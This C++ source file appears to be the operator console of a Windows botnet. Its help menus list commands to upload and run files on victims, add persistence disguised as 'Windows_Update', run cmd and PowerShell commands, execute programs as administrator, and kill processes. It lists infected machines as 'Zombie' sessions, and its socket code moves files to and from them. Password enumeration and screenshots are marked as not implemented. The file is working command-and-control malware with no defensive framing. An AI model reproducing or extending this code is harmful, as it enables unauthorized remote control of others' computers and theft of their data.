#include "Scripts_s.h"

void Info::list_scripts()
{
	SetColor(2);
	std::cout << "[\t\t------------ List of all scripts ------------" << std::endl;
	std::cout << "[ You can enter : man <command> for more informations about a command" << std::endl;
	std::cout << "[	Man is only for exploit for transfer scripts " << std::endl;
	SetColor(14);
	std::cout << "#------------------------------ Folder action -----------------------------#" << std::endl;
	SetColor(6);
	std::cout << "[ pwd\t\t\t\t\t: Print the current path" << std::endl;
	std::cout << "[ ls\t\t\t\t\t: List all files and folders in the current directory" << std::endl;
	std::cout << "[ getTemp\t\t\t\t: Get the location of the temp directory" << std::endl;
	std::cout << "[ upload \"filename\"\t\t\t: Upload a file in the current directory" << std::endl;
	std::cout << "[ upload_exe \"filename\"\t\t\t: Upload and exe a file in the current directory" << std::endl;
	std::cout << "[ download \"filename\"\t\t\t: Download a file located in the current directory (you can target an another using cd)" << std::endl;
	std::cout << "[ download_dir \"filename\"\t\t: Download the target directory   ------NOT IMPLEMENTED" << std::endl;
	SetColor(14);
	std::cout << "#----------------------------- System commands ----------------------------#" << std::endl;
	SetColor(6);
	std::cout << "[ cd <directory>\t\t\t\t: Change directory" << std::endl;
	std::cout << "[ ps\t\t\t\t\t: List all process with their PID and name" << std::endl;
	std::cout << "[ kill -p <pid>\t\t\t\t: Kill a process by its PID" << std::endl;
	std::cout << "[ kill -n <name>\t\t\t: Kill a process by its name" << std::endl;
	std::cout << "[ self_persistence <keyname>\t\t: Put a persistence on the payload" << std::endl;
	std::cout << "[ default name is Windows_Update" << std::endl;
	std::cout << "[ persistence <file_name> <keyname>\t: Put a persistence on a given file in the current directory----NOT IMPLEMENTED" << std::endl;
	std::cout << "[ default keyname is Windows_Update" << std::endl;
	std::cout << "[ cmd <command>\t\t\t\t: Run a command using cmd" << std::endl;
	std::cout << "[ powershell <command>\t\t\t:Run a command using powershell" << std::endl;
	std::cout << "[ exe_admin <file_name>\t\t\t: Execute a file (.exe) in admin mode" << std::endl;
	std::cout << "[ exe <file_name>\t\t\t: Execute a file" << std::endl;
	SetColor(14);
	std::cout << "#-------------------------------- Exploit ----------------------------------#" << std::endl;
	SetColor(6);
	std::cout << "[ geo\t\t\t\t: Give the localization of the current session------NOT IMPLEMENTED" << std::endl;
	std::cout << "[ enum_web\t\t\t: enum all web passwords on the current session------NOT IMPLEMENTED" << std::endl;
	std::cout << "[ screenshot\t\t\t: Take a screenshot from the current target screen------NOT IMPLEMENTED" << std::endl;
	std::cout << "[ ask <exe> <name>\t\t: Upload and execute a given file as administrator with a custom name" << std::endl;
	std::cout << "[ you can choose a new file_name, default is Windows_Update.exe" << std::endl;

	SetColor(7);
}

void Info::print_help()
{
	SetColor(2);
	std::cout << "[*] You have now acces to the payload\n" << std::endl;
	std::cout << "[\t\t------------ List of Commands ------------\t\t]" << std::endl;
	SetColor(6);
	std::cout << "[ help\t\t\t: list all commands" << std::endl;
	std::cout << "[ man <command>\t\t: Give more informations about a command" << std::endl;
	std::cout << "[Man is only for exploit and transfer scripts " << std::endl;
	std::cout << "[ list_scripts\t\t: List all scripts available" << std::endl;
	std::cout << "[ version\t\t: Print the current version and changes" << std::endl;
	std::cout << "[ getcurrentsession\t: Print the information about the current session" << std::endl;
	std::cout << "[ getsysinfo\t\t: Give information about the current session (user ...)" << std::endl;
	std::cout << "[ getip\t\t\t: Give the External IP address of the current session" << std::endl;
	std::cout << "[ set_session <nb_session>\t\t: Switch to an another session" << std::endl;
	std::cout << "[ list\t\t\t: list all actives sessions" << std::endl;
	std::cout << "[ exit_session <number>\t: Exit a given session" << std::endl;
	std::cout << "[ exit\t\t\t: exit the program" << std::endl;
	SetColor(7);
}

 bool Info::set_session(Server* server,const std::string nb_session)
{
	int nb= atoi(nb_session.c_str());
	std::vector<st_Client> clients = server->getClients();
	if (nb <= clients.size())
	{
		print_status("Switching with session " + nb_session+" ...");
		server->setDefaultClient(clients[nb-1]);
		print_done("Done");
		return 1;
	}
	else
	{
		print_error("Can't find " + nb_session);
		return 0;
	}
}

 void Info::list(Server* server)
{
	print_status("Enuming clients...");
	SetColor(2);
	std::vector<st_Client> clients = server->getClients();
	for (int i = 0; i < clients.size(); i++)
	{
		print_done("Zombie " + std::to_string(clients[i].number) + " Ip : " + clients[i].ip_extern);
	}
}


void Info::version(Server* server)
{
	print_debug("BOTNET version : " + std::string(VERSION));
	print_debug("Last update : " + std::string(UPDATE));
}
void Info::getcurrentsession(Server* server)
{
	SetColor(14);
	std::cout << "Current session number : " << server->getDefaultClient().number <<std::endl;
	std::cout << "Connected with : " << server->getDefaultClient().ip_extern << std::endl;
	SetColor(7);
}
void SetColor(int value)
{
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), value);
	/*
	1: Blue
	2 : Green
	3 : Cyan
	4 : Red
	5 : Purple
	6 : Yellow(Dark)
	7 : Default white
	8 : Gray / Grey
	9 : Bright blue
	10 : Brigth green
	11 : Bright cyan
	12 : Bright red
	13 : Pink / Magenta
	14 : Yellow
	15 : Bright white
	- Numbers after 15 are background colors -
	*/
}
void Transfer::uploadToClient(Server* serv1, const std::string filename)
{
	std::cout << "[*] Starting the upload of : " << filename << std::endl;
	char buffer[BUFFER_LEN] = { 0 };

	std::ifstream file(filename, std::ios::binary | std::ios::in);

	if (file)
	{
		SOCKET cl_sock = serv1->getDefaultClient().sock;
		const int len = 1024;
		print_status("Sending data ..");
		const int size = getSize(filename);

		std::cout << size << " bytes to send" << std::endl;
		print_status(std::to_string(size) + " bytes to send");

		serv1->send_b(size); // SIZE
		int current_size = 0;
		char memblock[len] = { 0 };
		const int rest = size % len;
		Sleep(2000);
		int nb = 0;
		file.seekg(0, std::ios::beg);
		bool done = 0;
		int pourcentage = 0;
		std::thread t_refresh(refresh, &done,200,&pourcentage);

		while (current_size != size)
		{
			if (current_size+rest==size)
			{
				file.read(memblock, rest);
				send(cl_sock, memblock, rest, 0);
				break;
			}
			else
			{
				file.read(memblock, len);
				send(cl_sock, memblock, len, 0);
				current_size += len;
				file.seekg(current_size, std::ios::beg);
			}
			pourcentage = current_size * 100;
			pourcentage = pourcentage / size;
		}
		done = 1;
		t_refresh.join();
		print_done("Done");
	}
	else
	{
		serv1->send_b("STOP");
		std::cout << "[*] Error can\'t open file : " << filename << std::endl;
	}
}
void Transfer::downloadFromClient(Server* serv1, const std::string filename)
{	
	char buffer[BUFFER_LEN] = { 0 };
	SOCKET cl_sock = serv1->getDefaultClient().sock;

	recv(cl_sock, buffer, BUFFER_LEN, 0); // SIZE
	const unsigned int size = atoi(buffer);
	print_status(std::to_string(size) + " bytes to download");

	std::ofstream file_export(filename, std::ios::binary | std::ios::out | std::ios::trunc);

	if (file_export)
	{
		print_status("File created");
		print_warning("Starting the download ..");
		const int len = 1024;
		int current_size = 0;
		char memblock[len] = { 0 };
		const int rest = size % len;
		Sleep(2000);
		int pourcentage = 0;
		bool done = 0;
		std::thread t_refresh(refresh, &done, 200, &pourcentage);

		while (current_size != size || std::string(memblock) == "STOP")
		{
			if (current_size + rest == size)
			{
				recv(cl_sock, memblock, rest, 0);
				file_export.write(memblock, rest);
				break;
			}
			else
			{
				recv(cl_sock, memblock, len, 0);
				file_export.write(memblock, len);
				current_size += len;
			}
			pourcentage = current_size * 100;
			pourcentage = pourcentage / size;

		}
		done = 1;
		t_refresh.join();
		file_export.close();
		print_done("Done");
		
	}
	else
	{
		print_error("Can't create the file : "+filename);
	}
}

int Transfer::getSize(std::string filename)
{
	std::ifstream file(filename, std::ios::binary);
	if (file)
	{
		std::streampos beg, end;
		beg = file.tellg();
		file.seekg(0, std::ios::end);
		end = file.tellg();
		file.close();
		return (end - beg);
	}
	else
		return 0;

}
